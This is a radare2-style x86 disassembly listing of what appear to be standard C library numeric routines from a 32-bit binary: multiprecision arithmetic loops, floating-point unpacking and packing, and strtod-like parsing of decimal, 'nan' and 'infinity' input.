mov dword [var_sp_8h], ecx
and eax, 0xfffffff0
mov dword [var_sp_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
call fcn.0808cc10
jmp 0x808d4f5
cmp edx, 0x1f
jg 0x808d541
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808d080
jmp 0x808d4f5
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
and eax, 0xfffffff0
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0808d150
jmp 0x808d4f5
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808d5a8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808d5a5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
sbb eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
sbb eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
sbb eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
sbb eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
sbb eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
sbb eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
sbb eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
sbb eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808d5a8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
adc edx, 0
sub dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808d620
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov eax, dword [arg_14h]
mov ecx, dword [arg_18h]
push ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov ebx, dword [arg_1ch]
mov dword [edi], ecx
mov edx, ebx
shr edx, 0x1f
mov dword [eax], edx
mov edx, ebx
shr edx, 0x14
and edx, 0x7ff
lea eax, [edx - 0x3ff]
mov dword [esi], eax
mov esi, ebx
and esi, 0xfffff
test edx, edx
mov dword [edi + 4], esi
jne 0x808d71b
test ecx, ecx
jne 0x808d69f
test esi, esi
jne 0x808d69f
mov eax, dword [arg_10h]
mov dword [eax], 0
pop ebx
pop esi
pop edi
mov eax, 2
leave
ret
mov esi, dword [edi + 4]
test esi, esi
je 0x808d6d9
bsr ebx, esi
mov edx, dword [edi]
xor ebx, 0x1f
sub ebx, 0xb
mov ecx, ebx
shl esi, cl
mov eax, edx
mov ecx, 0x20
sub ecx, ebx
shr eax, cl
mov ecx, ebx
or esi, eax
shl edx, cl
mov eax, 0xfffffc02
mov dword [edi + 4], esi
sub eax, ebx
mov dword [edi], edx
mov esi, dword [arg_10h]
mov dword [esi], eax
jmp 0x808d695
bsr ebx, dword [edi]
xor ebx, 0x1f
cmp ebx, 0xa
jle 0x808d702
mov eax, dword [edi]
lea ecx, [ebx - 0xb]
mov dword [edi], 0
shl eax, cl
mov dword [edi + 4], eax
mov edx, dword [arg_10h]
mov eax, 0xfffffbed
sub eax, ebx
mov dword [edx], eax
jmp 0x808d695
mov edx, dword [edi]
mov ecx, 0xb
sub ecx, ebx
mov eax, edx
shr eax, cl
lea ecx, [ebx + 0x15]
shl edx, cl
mov dword [edi + 4], eax
mov dword [edi], edx
jmp 0x808d6f4
or esi, 0x100000
mov dword [edi + 4], esi
jmp 0x808d695
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov ecx, dword [arg_20h]
mov edx, dword [arg_1ch]
mov eax, dword [arg_18h]
mov esi, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_18h], edx
mov ecx, dword [arg_10h]
mov dword [var_1ch], eax
mov edx, dword [arg_14h]
movzx eax, byte [var_13h]
shr al, 7
movzx eax, al
mov dword [edx], eax
movzx edx, word [var_14h]
and edx, 0x7fff
lea eax, [edx - 0x3fff]
test edx, edx
mov dword [ecx], eax
mov eax, dword [var_1ch]
mov dword [esi], eax
mov ecx, dword [var_18h]
mov dword [esi + 4], ecx
jne 0x808d7a2
test eax, eax
jne 0x808d7af
test ecx, ecx
jne 0x808d7af
mov eax, dword [arg_10h]
mov dword [eax], 0
add esp, 0x10
mov eax, 2
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [esi + 4]
and ebx, 0x7fffffff
test ebx, ebx
mov dword [esi + 4], ebx
je 0x808d7f3
bsr eax, ebx
mov edi, eax
xor edi, 0x1f
je 0x808d7e5
mov edx, dword [esi]
mov ecx, edi
shl ebx, cl
mov ecx, 0x20
sub ecx, edi
mov eax, edx
shr eax, cl
mov ecx, edi
or ebx, eax
shl edx, cl
mov dword [esi + 4], ebx
mov dword [esi], edx
mov eax, 0xffffc002
mov edx, dword [arg_10h]
sub eax, edi
mov dword [edx], eax
jmp 0x808d7a2
mov eax, dword [esi]
test eax, eax
je 0x808d813
bsr edi, eax
mov dword [esi], 0
xor edi, 0x1f
mov ecx, edi
shl eax, cl
mov dword [esi + 4], eax
mov eax, 0xffffbfe2
jmp 0x808d7ea
mov ecx, dword [arg_10h]
mov dword [esi + 4], 0x80000000
mov dword [ecx], 0xffffc002
jmp 0x808d7a2
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
and edx, 0x7fffffff
mov ebp, esp
sub esp, 4
mov eax, dword [arg_10h]
shl eax, 0x1f
or edx, eax
mov eax, dword [arg_ch]
and edx, 0x807fffff
add eax, 0x7f
and eax, 0xff
shl eax, 0x17
or edx, eax
mov eax, dword [arg_8h]
and edx, 0xff800000
mov eax, dword [eax]
and eax, 0x7fffff
or edx, eax
mov dword [var_4h], edx
fld dword [ebp - 4]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov ecx, dword [arg_10h]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov edx, ecx
shl edx, 0x1f
add ebx, 0x3ff
mov eax, dword [esi]
mov ecx, edx
and ebx, 0x7ff
and ecx, 0x800fffff
shl ebx, 0x14
mov edx, ecx
or edx, ebx
mov ebx, dword [esi + 4]
mov esi, dword [var_4h]
mov ecx, edx
mov dword [var_10h], eax
and ecx, 0xfff00000
and ebx, 0xfffff
mov edx, ecx
or edx, ebx
mov ebx, dword [var_8h]
mov dword [var_ch], edx
fld qword [ebp - 0x10]
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x808a399
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x808a26b
mov eax, dword [arg_24h]
test eax, eax
je 0x808a265
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808a35f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x808a240
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x808a353
lea edx, [eax + edi]
cmp edx, 9
jg 0x808a353
imul esi, dword [eax*4 + 0x80a61c0]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a61c0]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x808a2d0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a339
dec ecx
je 0x808a31d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a339
dec ecx
jne 0x808a30b
mov eax, 1
add dword [var_14h], eax
je 0x808a2c6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a2c6
cmp esi, edi
je 0x808a34f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a34f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a344
xor eax, eax
jmp 0x808a322
mov edx, dword [edi*4 + 0x80a61c0]
jmp 0x808a2b2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x808a390
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x808a381
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x808a370
test al, al
jne 0x808a265
add ebx, edx
jmp 0x808a268
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x808a381
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808a3b6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x808a249
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a423
dec ecx
je 0x808a407
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a423
dec ecx
jne 0x808a3f5
mov eax, 1
add dword [var_10h], eax
je 0x808a3ad
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a3ad
cmp esi, edi
je 0x808a43b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a43b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a430
xor eax, eax
jmp 0x808a40c
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov esi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
mov dword [var_14h], edx
cmp dword [var_10h], 0xffffc002
mov eax, dword [arg_18h]
mov dword [var_1ch], eax
jge 0x808a0a6
mov ebx, 0xffffc002
sub ebx, dword [var_10h]
cmp ebx, 0x40
jg 0x808a202
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne esi, edx
cmp ebx, 0x40
je 0x808a1ce
cmp ebx, 0x1f
jle 0x808a19e
mov ecx, ebx
lea eax, [ebx + 0x1e]
dec ecx
cmovns eax, ecx
sar eax, 5
mov edx, dword [edi + eax*4]
shl eax, 5
mov dword [var_18h], edx
mov edx, ecx
sub edx, eax
mov dword [var_1ch], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [ebx + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x808a02f
mov eax, esi
or eax, 1
cmp dword [edi + edx*4], 0
cmovne esi, eax
inc edx
jmp 0x808a010
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
mov ecx, ebx
dec eax
test dword [var_18h], eax
mov dword [esp], edi
cmovne esi, edx
cmp ebx, 0xffffffff
lea edx, [ebx + 0x1f]
cmovg edx, ebx
sar edx, 5
mov eax, edx
shl eax, 5
sub ecx, eax
mov eax, 2
sub eax, edx
mov dword [var_sp_ch], ecx
lea edx, [edi + edx*4]
mov dword [var_4h], edx
mov dword [var_sp_8h], eax
call fcn.0808c750
xor edx, edx
nop
lea esi, [esi]
cmp ebx, 0xffffffff
lea eax, [ebx + 0x1f]
cmovg eax, ebx
sar eax, 5
cmp edx, eax
jge 0x808a09f
mov ecx, edx
inc edx
sub ecx, eax
mov dword [edi + ecx*4 + 8], 0
jmp 0x808a080
mov dword [var_10h], 0xffffc001
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x808a122
test esi, esi
jne 0x808a197
mov edx, dword [edi]
test dl, 1
jne 0x808a0d0
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x808a122
nop
lea eax, [edx + 1]
lea ebx, [edi + 4]
mov esi, 2
cmp eax, edx
mov dword [edi], eax
mov ecx, ebx
jae 0x808a163
mov eax, dword [edi + 4]
lea ebx, [edi + 8]
mov esi, 1
mov ecx, ebx
inc eax
test eax, eax
mov dword [edi + 4], eax
jne 0x808a163
inc dword [var_10h]
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 2
call fcn.0808c750
or dword [edi + 4], 0x80000000
cmp dword [var_10h], 0x4000
jle 0x808a148
mov eax, dword [var_14h]
test eax, eax
je 0x808a140
fld dword [0x80a6100]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
fld dword [0x80a61a0]
jmp 0x808a138
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_8h], edi
mov dword [arg_10h], eax
mov dword [arg_ch], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
jmp 0x808d8e0
cmp ecx, ebx
je 0x808a17b
xor edx, edx
dec esi
cmp edx, esi
jge 0x808a17b
mov esi, esi
mov eax, dword [ebx + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808a170
cmp dword [var_10h], 0xffffc001
jne 0x808a122
mov edx, dword [edi + 4]
mov eax, 0xffffc002
test edx, edx
cmovns eax, dword [var_10h]
mov dword [var_10h], eax
jmp 0x808a122
mov edx, dword [edi]
jmp 0x808a0d0
test ebx, ebx
jle 0x808a09f
mov eax, dword [edi]
lea edx, [ebx - 1]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_sp_8h], 2
call fcn.0808c750
jmp 0x808a09f
mov eax, dword [edi + 4]
mov dword [var_1ch], 0x1f
xor edx, edx
mov dword [var_18h], eax
mov ecx, dword [edi + edx*4]
mov eax, esi
or eax, 1
test ecx, ecx
cmovne esi, eax
inc edx
cmp edx, 1
jle 0x808a1dd
mov dword [edi], 0
mov dword [edi + 4], 0
jmp 0x808a09f
call fcn.08048b20
fldz
mov dword [eax], 0x21
jmp 0x808a138
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x808a399
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x808a26b
mov eax, dword [arg_24h]
test eax, eax
je 0x808a265
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808a35f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x808a240
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x808a353
lea edx, [eax + edi]
cmp edx, 9
jg 0x808a353
imul esi, dword [eax*4 + 0x80a61c0]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a61c0]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x808a2d0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a339
dec ecx
je 0x808a31d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a339
dec ecx
jne 0x808a30b
mov eax, 1
add dword [var_14h], eax
je 0x808a2c6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a2c6
cmp esi, edi
je 0x808a34f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a34f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a344
xor eax, eax
jmp 0x808a322
mov edx, dword [edi*4 + 0x80a61c0]
jmp 0x808a2b2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x808a390
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x808a381
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x808a370
test al, al
jne 0x808a265
add ebx, edx
jmp 0x808a268
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x808a381
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808a3b6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x808a249
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a423
dec ecx
je 0x808a407
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a423
dec ecx
jne 0x808a3f5
mov eax, 1
add dword [var_10h], eax
je 0x808a3ad
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a3ad
cmp esi, edi
je 0x808a43b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a43b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a430
xor eax, eax
jmp 0x808a40c
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1138
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_1078h], 0xa
mov dword [var_10a0h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x808a499
mov ecx, dword [edx + 0x2c]
mov dword [var_10a4h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x808a499
cmp al, 0x7f
je 0x808a499
mov esi, dword [edx + 0x28]
mov dword [var_10a0h], esi
cmp byte [esi], 0
jne 0x808a4a3
mov dword [var_10a0h], 0
mov dword [var_10a4h], 0
mov edx, dword [edx + 0x24]
mov dword [var_109ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_1080h], 0
mov dword [var_10a8h], eax
mov dword [var_106ch], 0
mov dword [var_1074h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x808a4e2
cmp cl, 0x2d
je 0x808c261
cmp cl, 0x2b
je 0x808c258
mov edx, dword [var_109ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_1112h], dl
mov byte [var_1111h], dl
je 0x808c24d
mov eax, edx
cmp byte [ebx + edi], al
jne 0x808c240
mov ecx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a525
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808a54d
cmp al, 0x39
jle 0x808a727
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a727
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808a6a9
cmp dword [ecx + ebx*4], 0x6e
jne 0x808a693
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x808a693
fld dword [0x80a61a4]
add edi, 3
fstp xword [ebp - 0x10b4]
cmp byte [edi], 0x28
je 0x808a5d1
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld xword [ebp - 0x10b4]
add esp, 0x1138
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x808a5d9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x808a5f4
cmp eax, 0x7a
jle 0x808a5d9
cmp dl, 0x5f
je 0x808a5d9
cmp dl, 0x29
je 0x808a602
mov edi, ebx
jmp 0x808a5b4
mov edx, dword [arg_14h]
lea eax, [var_1060h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_1060h], edi
mov ecx, eax
mov ebx, edx
jne 0x808a5b4
and edx, 0x7fffffff
mov dword [var_105ch], 0
mov dword [var_1058h], 0xc0000000
mov esi, edx
mov dword [var_1054h], 0x7fff
or esi, eax
jne 0x808a66f
xor ecx, ecx
mov ebx, 0x40000000
mov eax, ebx
mov dword [var_105ch], ecx
or eax, 0x80000000
mov dword [var_1058h], eax
fld xword [ebp - 0x105c]
fstp xword [ebp - 0x10b4]
jmp 0x808a5b4
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6a2
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x808a5c6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x808a71c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6fc
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_1074h]
test edx, edx
je 0x808a711
fld dword [0x80a6100]
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808a5c6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808a56f
mov eax, esi
cmp al, 0x30
je 0x808c207
mov eax, dword [var_10a0h]
mov dword [var_1088h], edi
test eax, eax
je 0x808c1ed
mov ecx, dword [var_10a0h]
movzx edx, byte [ecx]
mov esi, esi
mov eax, esi
cmp al, 0x30
je 0x808a785
xor ebx, ebx
test dl, dl
je 0x808c1df
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808a78b
mov ecx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a770
inc edi
movzx esi, byte [edi]
jmp 0x808a750
test al, al
je 0x808a785
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a7a3
cmp dword [var_1078h], 0x10
je 0x808c18e
mov dword [var_1084h], edi
mov dword [var_1090h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808c183
cmp dword [var_1078h], 0x10
je 0x808c163
mov eax, dword [var_10a0h]
test eax, eax
je 0x808a80a
mov ecx, dword [var_10a0h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x808c155
cmp al, byte [ebx + edi]
jne 0x808a806
mov edx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808a7e8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x808a7b3
test al, al
je 0x808a800
mov eax, dword [var_10a4h]
test eax, eax
je 0x808bdc3
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808bdc3
mov ecx, dword [var_1088h]
mov eax, dword [var_10a4h]
mov dword [var_4h], edi
mov edx, dword [var_10a0h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x808bdb4
cmp eax, dword [var_1088h]
je 0x808bd9c
cmp eax, dword [var_1084h]
jb 0x808bd8c
mov ecx, dword [var_1084h]
mov edi, eax
mov dword [var_1090h], 0
cmp ecx, eax
jae 0x808a8a5
movzx eax, byte [ecx]
mov edx, dword [var_1090h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_1090h]
inc ecx
cmp ecx, edi
mov dword [var_1090h], edx
jb 0x808a884
mov ecx, dword [var_1090h]
mov dword [var_1098h], 0
mov dword [var_1094h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x808a8c7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_1090h]
test eax, eax
jne 0x808a8ea
mov eax, dword [var_1074h]
test eax, eax
je 0x808a6a2
fld dword [0x80a6104]
jmp 0x808a5c6
mov eax, dword [var_1098h]
test eax, eax
je 0x808a99c
mov ecx, dword [var_109ch]
mov esi, dword [var_109ch]
movzx ecx, byte [ecx]
mov byte [var_1112h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_1084h]
movzx eax, byte [var_1112h]
cmp byte [ecx], al
je 0x808a92a
inc dword [var_1084h]
jmp 0x808a911
test dl, dl
mov ebx, 1
je 0x808bd80
mov esi, dword [var_109ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_1084h]
cmp al, byte [ebx + ecx]
jne 0x808bd70
mov esi, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x808a941
mov eax, dword [var_1098h]
add eax, dword [var_10a8h]
add dword [var_1084h], eax
cmp dword [var_1078h], 0x10
je 0x808bd5a
mov edx, dword [var_106ch]
sub edx, dword [var_1098h]
mov esi, dword [var_1098h]
mov dword [var_106ch], edx
sub dword [var_1090h], esi
cmp dword [var_1078h], 0x10
je 0x808bb42
mov ebx, dword [var_106ch]
test ebx, ebx
mov edx, ebx
js 0x808bb29
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_1094h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_1094h]
mov dword [var_106ch], ebx
add eax, ebx
cmp eax, 0x1345
jg 0x808ab74
cmp ebx, 0xffffecaa
jl 0x808bb19
mov ecx, dword [var_1094h]
test ecx, ecx
jle 0x808ad3c
mov esi, dword [var_109ch]
mov edx, dword [var_10a0h]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov eax, dword [var_1084h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_1094h]
mov dword [var_18h], ecx
lea edx, [var_1070h]
mov dword [esp], eax
lea ecx, [var_82ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.0808a220
mov ebx, dword [var_106ch]
mov dword [var_1084h], eax
